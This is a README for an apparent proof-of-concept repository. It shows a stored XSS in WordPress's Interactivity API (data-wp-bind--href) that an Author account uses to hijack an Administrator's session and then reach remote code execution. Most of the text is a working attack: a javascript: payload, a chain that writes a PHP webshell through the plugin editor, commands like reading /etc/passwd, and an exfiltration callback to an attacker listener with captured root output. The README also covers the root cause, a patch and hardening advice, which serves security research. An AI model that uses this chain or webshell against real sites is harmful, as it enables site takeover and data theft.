# wp-interactivity-xss

**A stored XSS in WordPress's Interactivity API — `data-wp-bind--href` — that turns a
low-privileged Author into an Administrator's hands, and from there into code execution.**

> ##
> This repository is a **proof of concept for a local, disposable WordPress **.
> Every script targets `127.0.0.1` by default and refuses nothing — it is your job to
> point it only at systems you own. Do not run any of this against a site you do not
> have written permission to test. The webshell payload is included because the lab
> chain writes and restores it; it is not a tool for attacking third parties.
>


---

## TL;DR

WordPress sanitises URLs on the **server** (`esc_url()` / `wp_kses()`) but the
**client-side Interactivity API** copies `data-wp-context` values into live DOM
attributes with no scheme check:

```html
<div data-wp-interactive="pwn"
     data-wp-context="{&quot;u&quot;:&quot;javascript:window.__XSS=1;void 0&quot;}">
  <a id="t" href="https://example.com/" data-wp-bind--href="context.u">CAP</a>
</div>
```

- `wp_kses_post()` keeps `data-wp-context` (it is a `data-*` attribute) but never
  inspects the JSON *inside* it for URL schemes.
- The server renders `href="https://example.com/"`.
- After hydration the `bind` directive writes the context value verbatim:
  `href="javascript:window.__XSS=1;void 0"`.
- One click executes attacker JavaScript **in the page's origin**.

If the victim is an Administrator, the same click can reach
`/wp-admin/plugin-editor.php`, harvest its nonce, overwrite a plugin file with PHP,
and yield **remote command execution** on the WordPress host.

| | |
|---|---|
| **Affected (lab-verified)** | WordPress 7.1.2, unguarded Interactivity bundle `sha256 726ac59577c8aeeec94c61bfb7791a709e401b5d871d35c39a65cd948f6124e3` |
| **Required capability** | `edit_posts` / `publish_posts` (Author) — **no** `unfiltered_html` |
| **Interaction** | One click by the victim |
| **Primitive** | Stored XSS via client/server URL-policy divergence |
| **Escalation** | Administrator plugin editor → PHP webshell → RCE |
| **Lab severity** | Site takeover; root in the lab because the server was started with `--allow-root` |

Long-form write-ups:

- **Part I — discovery:** <https://shoo0lin.github.io/posts/interactivity-accordion.html>
- **Part II — escalation:** <https://shoo0lin.github.io/posts/click-to-root.html>

---

## The chain

```
 Author (uid 4, no unfiltered_html)
   │  POST /?rest_route=/wp/v2/posts
   │  content = core/accordion + island { data-wp-context: "javascript:…" }
   ▼
 WordPress server
   │  kses keeps data-wp-context; esc_url sanitises the static href
   │  served HTML: href="https://example.com/"      ← looks harmless
   ▼
 Victim's browser (Administrator)
   │  Interactivity runtime hydrates
   │  bind directive: el.setAttribute('href', context.u)
   │  live DOM: href="javascript:…"                 ← no scheme check
   │  victim clicks
   ▼
 Attacker JavaScript runs in the Administrator's origin
   │  GET  /wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php
   │  scrape hidden form fields + nonce
   │  POST /wp-admin/plugin-editor.php  newcontent = <?php echo shell_exec($_GET['cmd']);
   ▼
 hello.php is now a webshell
   │  attacker: GET /wp-content/plugins/hello.php?cmd=id
   ▼
 uid=0(root) … (lab)   /   code execution as the web user (typical deployment)
```

The important asymmetry is in the middle: **the server and the client disagree about
what a safe URL is**, and the client writes last.

---

## Repository layout

```
.
├── poc/
│   ├── wp_lab.py                 # config, login, nonce, island/accordion helpers
│   ├── validate_xss.py           # minimal proof: server https → client javascript → click
│   ├── rce_cmd_chain.py          # admin click → plugin-editor write → HTTP command exec
│   ├── rce_exfil_chain.py        # same, plus an outbound callback to your listener
│   ├── c2listener.py             # listener for the outbound exfiltration step
│   ├── payloads/island.html      # the raw payload, commented
│   └── assets/hello.php.orig     # pristine plugin file used to restore the lab
├── evidence/                     # captured JSON + listener log from the lab run
├── fix/
│   ├── bind.original.ts          # vulnerable directive source
│   ├── bind.patched.ts           # patched directive source
│   └── bind.patched.diff         # the guard as a unified diff
├── media/                        # screenshots + 42-second demo recording
├── docker/provision.sh           # disposable WP 7.1.2 lab on 127.0.0.1:18080
├── requirements.txt
└── LICENSE
```

---

## Quickstart

### 1. Lab

```bash
./docker/provision.sh
```

This creates `wpdb` (MariaDB 11) and `wpsite` (WordPress 7.1.2 + Twenty Twenty-Five),
installs an `author` and an administrator, and serves it on
`http://127.0.0.1:18080`. Default lab credentials are in the script; override them with
environment variables if you prefer.

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt
playwright install chromium
```

### 2. Minimal XSS validation

```bash
cd poc
python3 validate_xss.py
```

Expected output:

```
[*] target: http://127.0.0.1:18080   (LAB ONLY)
[*] acting as: author  uid=4  roles=['author']
[*] post created: #961  http=201  status=publish  author=4
[*] server  href (kses, pre-hydration): 'https://example.com/'
[*] client  href (post-hydration):      'javascript:window.__XSS=1;void 0'
[*] click marker executed:               1

PASS — stored XSS validated: server says https, browser executes javascript:
```

`--keep` leaves the post in place so you can inspect it in DevTools. Without it the
script logs in as the Administrator and deletes the post.

### 3. Command execution

```bash
python3 rce_cmd_chain.py
```

The script publishes as the Author, logs in as the Administrator in headless
Chromium, clicks the poisoned link, then issues `id`, `cat /etc/passwd`, and
`uname -a; hostname; pwd` through the webshell. It restores `hello.php` from
`poc/assets/hello.php.orig`, verifies the SHA-256, and deletes the post.

### 4. Outbound exfiltration (stronger proof)

Terminal A:

```bash
python3 c2listener.py --port 9099
```

Terminal B:

```bash
python3 rce_exfil_chain.py 172.19.0.1 9099
```

The WordPress container POSTs command output to your listener. That direction of
connection is the point: the compromised server initiates egress to the attacker.

If your Docker bridge uses a different gateway, read it with:

```bash
docker exec wpsite ip route | awk '/default/{print $3}'
```

### Configuration

All scripts read environment variables, so nothing is hardcoded to one machine:

| Variable | Default | Meaning |
|---|---|---|
| `WP_BASE` | `http://127.0.0.1:18080` | WordPress URL |
| `WP_CONTAINER` | `wpsite` | container used for hash/restore (skipped if absent) |
| `WP_AUTHOR_USER` / `WP_AUTHOR_PASS` | `author` / `labauthorpass` | low-privileged account |
| `WP_ADMIN_USER` / `WP_ADMIN_PASS` | `bindadmin` / `labadminpass` | victim account |
| `CHROME_PATH` | auto-detect | Chromium/Chrome binary |
| `WP_OUT_DIR` | `./out` | where JSON evidence is written |

---

## Evidence from the lab

The captured files under `evidence/` are the actual runs used in the write-up.

`poc_simple_validation.json`:

```json
{
  "post": 961,
  "server_href": "https://example.com/",
  "hydrated_href": "javascript:window.__XSS=1;void 0",
  "click_marker": 1,
  "cleaned_up": true
}
```

`rce_cmd_chain.json` (excerpt):

```json
{
  "author": { "uid": 4, "roles": ["author"] },
  "post": { "id": 962, "http": 201, "status": "publish", "author": 4 },
  "rce_state": { "s": "done", "save": 200, "done": true },
  "hello_php_sha256_before": "1244904e…6d58fe53",
  "hello_php_sha256_after_write": "4b461219…b414536c",
  "hello_php_content_after_write": "<?php echo shell_exec($_GET['cmd']);",
  "cmds": [
    {
      "cmd": "id",
      "status": 200,
      "output": "uid=0(root) gid=0(root) groups=0(root),1(bin),…\n"
    }
  ],
  "hello_php_sha256_restored": "1244904e…6d58fe53",
  "restored_ok": true
}
```

`exfil-c2.log` — the server calling back:

```
2026-10-13T06:10:49.694163Z POST /exfil from 172.19.0.3 UA=curl/8.22.0
  BODY: uid=0(root) gid=0(root) groups=0(root),1(bin),...
cb722bffb922
Linux 6.6.87.2-microsoft-standard-WSL2 x86_64 Linux
```

`172.19.0.3` is the WordPress container; `172.19.0.1` is the attacker host.

Screenshots and the uncut 42-second recording live in [`media/`](media/).

The scripts were re-run end-to-end on 2026-11-09 against a fresh start of the same
lab; see [`evidence/verification-2026-11-09.md`](evidence/verification-2026-11-09.md).

### Pinned hashes

| Artefact | SHA-256 |
|---|---|
| Served interactivity bundle (WP 7.1.2) | `726ac59577c8aeeec94c61bfb7791a709e401b5d871d35c39a65cd948f6124e3` |
| Official `wordpress-7.1.2.tar.gz` | `c0c666689d66b870d8825500bb8e402ed04de52602c61a6f516c6236b8c9ac67` |
| `bind.ts` source (6.56.0 / 7.0.0) | `0ecba2953f3ff5fbf8189246b2db0b520109b4bd5d8a6ab924fb1ae55d98fd8e` |
| `hello.php` baseline | `1244904e04a09c848d6e776ffecd98325ec613f277578abf3cb98c6b6d58fe53` |
| `hello.php` after webshell write | `4b461219f904c073602ac9668a8ac09dfad7a020253105ad5df89246b414536c` |

The served bundle is byte-identical to the official 7.1.2 release archive. The
`hello.php` transition and restoration are the integrity proof for the escalation.

---

## Root cause

`packages/interactivity/src/directives/bind.ts` (WordPress 7.1.2) ends with a direct
attribute write and no URL inspection:

```ts
element.props[ attribute ] = result;
// …
el.setAttribute( attribute, result );
```

The server, by contrast, runs `wp_kses_post()` on the post content and
`esc_url()` on URL attributes. `data-wp-context` is allowed because it is a `data-*`
attribute, and its JSON payload is never interpreted as a URL. The client later
promotes that payload into `href`.

That is the whole bug: **policy is enforced at write time on the server, but the
same value is written again on the client by code that does not share the policy.**

---

## The fix

The guard belongs at the mutation boundary in `bind.ts`: before writing a
URI-bearing attribute, validate the final value against the server's own allowlist
(`wp_allowed_protocols()`) and refuse the write when the scheme is not allowed.

```ts
if ( isUriAttribute( attribute ) && ! isAllowedUrl( result ) ) {
    return; // leave the server-rendered value intact
}
el.setAttribute( attribute, result );
```

A lab build of that patch (`fix/bind.patched.ts`, `fix/bind.patched.diff`) blocks
the `javascript:` write while keeping legitimate `https:` links working.

Defence in depth:

1. **Server:** treat context-bound URI values in `data-wp-bind--href` from users
   without `unfiltered_html` as untrusted — validate the scheme or strip the
   directive.
2. **CSP:** restrict `javascript:` navigation on post pages.
3. **Operational:** set `DISALLOW_FILE_EDIT` to `true`. It does not fix the XSS, but
   it cuts the shortest path from a stolen Administrator session to code execution.

---

## Honest scope

- **Not a memory-safety bug.** The escalation abuses a legitimate Administrator
  feature (the plugin editor). The security defect is the client/server policy
  asymmetry that lets a lower-privileged user borrow the Administrator's session.
- **Root is lab-specific.** The lab runs `wp server --allow-root`, so `id` returns
  `uid=0`. A typical LAMP/container deployment runs PHP as `www-data`; the same chain
  still yields code execution, as that user. The portable claim is **code execution
  as the web user**, i.e. full site compromise.
- **`DISALLOW_FILE_EDIT` defaults to editing allowed.** With it set to `true` the RCE
  tail is cut and the chain falls back to data theft and persistent XSS.
- **A click is required.** The directive sets `href`; it does not navigate.
- **Cookie/session data is redacted** in this repository. The lab passwords are
  disposable defaults created by `docker/provision.sh`.

---

## Disclosure

Upstream disclosure status is pending. This repository documents lab-verified
behaviour only; it makes no claim about any production deployment.

## License

MIT — see [LICENSE](LICENSE).
